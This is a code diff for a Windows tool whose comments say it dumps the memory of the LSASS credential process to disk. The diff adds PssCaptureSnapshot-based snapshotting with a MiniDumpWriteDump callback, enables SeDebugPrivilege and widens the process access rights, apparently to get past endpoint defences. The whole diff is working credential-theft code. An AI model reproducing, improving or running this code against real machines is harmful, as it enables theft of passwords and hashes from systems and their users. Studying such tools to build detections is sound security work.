@@ -6,10 +6,11 @@
 #include <iostream>
 using namespace std;
 
-// Global RTL functions
+// Global functions
 fnRtlInitUnicodeString RtlInitUnicodeString;
 fnRtlEqualUnicodeString RtlEqualUnicodeString;
 fnRtlGetVersion RtlGetVersion;
+fnPssCaptureSnapshot PssCaptureSnapshot;
 
 // Function:    Dump
 // Description: Dump LSASS process memory to disk
@@ -23,7 +24,7 @@ BOOL Dump(const wchar_t* wcDumpPath)
         return FALSE;
 
     // Resolve RTL functions
-    if (!ResolveHelpers())
+    if (!ResolveFunctions())
         return FALSE;
 
     // Patch hooks as needed
@@ -32,6 +33,8 @@ BOOL Dump(const wchar_t* wcDumpPath)
     HANDLE hDump = NULL;    // Handle to dump file
     HANDLE hLsass = NULL;   // Handle to LSASS process
     DWORD dwPid = 0;        // LSASS PID
+    DWORD dwResult = 0;     // Result of LSASS snapshot attempt
+    HPSS hSnapshot = NULL;  // Handle to LSASS PSS snapshot
     BOOL bStatus = FALSE;   // Status of dump
 
     // Create destination file
@@ -54,16 +57,25 @@ BOOL Dump(const wchar_t* wcDumpPath)
 
                     if (MiniDumpWriteDump) {
 
-                        wcout << "[+] Dumping to: " << wcDumpPath << endl;
+                        // Capture snapshot of LSASS
+                        if ((dwResult = PssCaptureSnapshot(hLsass, (PSS_CAPTURE_FLAGS)dwSnapshotFlags, CONTEXT_ALL, &hSnapshot)) == ERROR_SUCCESS) {
+                            MINIDUMP_CALLBACK_INFORMATION CallbackInfo;
+                            ZeroMemory(&CallbackInfo, sizeof(MINIDUMP_CALLBACK_INFORMATION));
+                            CallbackInfo.CallbackRoutine = ATPMiniDumpWriteDumpCallback;
+                            CallbackInfo.CallbackParam = NULL;
 
-                        // Perform the dump
-                        bStatus = MiniDumpWriteDump(hLsass, dwPid, hDump, MiniDumpWithFullMemory, NULL, NULL, NULL);
+                            wcout << "[+] Captured snapshot of LSASS process" << endl;
+                            wcout << "[+] Dumping to: " << wcDumpPath << endl;
 
-                        if (!bStatus)
-                            wcout << "[!] Dump failed: " << GetLastError() << endl;
-                        else
-                            wcout << "[+] Dump complete" << endl;
-                    
+                            // Perform the dump
+                            bStatus = MiniDumpWriteDump(hSnapshot, dwPid, hDump, MiniDumpWithFullMemory, NULL, NULL, &CallbackInfo);
+
+                            if (!bStatus)
+                                wcout << "[!] Dump failed: " << GetLastError() << endl;
+                            else
+                                wcout << "[+] Dump complete" << endl;
+                        }
+                        else wcout << "[!] LSASS snapshot failed: " << dwResult << endl;
                     }
                     else wcout << "[!] Failed to locate MiniDumpWriteDump function" << endl;
                 }
@@ -152,15 +164,22 @@ BOOL Requirements()
             // SeDebugPrivilege LUID = 0x14
             if (pTokenPrivs->Privileges[i].Luid.LowPart == 0x14) {
                 
-                // Located SeDebugPrivilege, enable it
-                pTokenPrivs->Privileges[i].Attributes |= SE_PRIVILEGE_ENABLED;
+                // Located SeDebugPrivilege, enable it if necessary
+                if (!(pTokenPrivs->Privileges[i].Attributes & SE_PRIVILEGE_ENABLED)) {
 
-                // Apply updated privilege struct to token
-                if (NtAdjustPrivilegesToken(hToken, FALSE, pTokenPrivs, dwSize, NULL, NULL) == 0) {
+                    pTokenPrivs->Privileges[i].Attributes |= SE_PRIVILEGE_ENABLED;
+
+                    // Apply updated privilege struct to token
+                    if (NtAdjustPrivilegesToken(hToken, FALSE, pTokenPrivs, dwSize, NULL, NULL) == 0) {
                     
-                    // Should be good to go
-                    bMet = TRUE;
+                        wcout << "[+] Enabled SeDebugPrivilege" << endl;
+
+                        // Should be good to go
+                        bMet = TRUE;
+                    }
                 }
+                // SeDebugPrivilege already enabled
+                else bMet = TRUE;
             }
         }
 
@@ -179,21 +198,23 @@ BOOL Requirements()
     return bMet;
 }
 
-// Function:    ResolveHelpers
-// Description: Resolve addresses for RTL helper/utility functions exported by NTDLL
+// Function:    ResolveFunctions
+// Description: Resolve addresses for NTDLL/Kernel32 functions
 // Called from: Dump
 // Returns:     True if all functions are resolved, false if any are not
-BOOL ResolveHelpers()
+BOOL ResolveFunctions()
 {
-    // NTDLL handle
+    // Module handles
     HMODULE hNTDLL = GetModuleHandle(L"ntdll.dll");
+    HMODULE hKernel32 = GetModuleHandle(L"kernel32.dll");
 
     // Get function pointers
     RtlInitUnicodeString = (fnRtlInitUnicodeString)GetProcAddress(hNTDLL, "RtlInitUnicodeString");
     RtlEqualUnicodeString = (fnRtlEqualUnicodeString)GetProcAddress(hNTDLL, "RtlEqualUnicodeString");
     RtlGetVersion = (fnRtlGetVersion)GetProcAddress(hNTDLL, "RtlGetVersion");
+    PssCaptureSnapshot = (fnPssCaptureSnapshot)GetProcAddress(hKernel32, "PssCaptureSnapshot");
 
-    if (!RtlInitUnicodeString || !RtlEqualUnicodeString || !RtlGetVersion)
+    if (!RtlInitUnicodeString || !RtlEqualUnicodeString || !RtlGetVersion || !PssCaptureSnapshot)
         return FALSE;
     else
         return TRUE;
@@ -268,7 +289,7 @@ HANDLE GetHandle(DWORD dwPid)
 
     // Open the process
     HANDLE hProcess = NULL;
-    NtOpenProcess(&hProcess, PROCESS_VM_READ | PROCESS_QUERY_LIMITED_INFORMATION, &oa, &cid);
+    NtOpenProcess(&hProcess, PROCESS_CREATE_PROCESS | PROCESS_CREATE_THREAD | PROCESS_DUP_HANDLE | PROCESS_QUERY_INFORMATION, &oa, &cid);
 
     // Return handle
     return hProcess;
@@ -370,4 +391,23 @@ DWORD GetWinVersion()
     RtlGetVersion(&osVers);
 
     return osVers.dwMajorVersion;
+}
+
+// Function:    ATPMiniDumpWriteDumpCallback
+// Description: This function tells MiniDumpWriteDump that a PSS snapshot is being dumped
+// Sources:     https://github.com/b4rtik/ATPMiniDump
+//              https://docs.microsoft.com/en-us/previous-versions/windows/desktop/proc_snap/export-a-process-snapshot-to-a-file
+BOOL CALLBACK ATPMiniDumpWriteDumpCallback(
+    __in     PVOID CallbackParam,
+    __in     const PMINIDUMP_CALLBACK_INPUT CallbackInput,
+    __inout  PMINIDUMP_CALLBACK_OUTPUT CallbackOutput
+)
+{
+    switch (CallbackInput->CallbackType)
+    {
+    case 16: // IsProcessSnapshotCallback
+        CallbackOutput->Status = S_FALSE;
+        break;
+    }
+    return TRUE;
 }
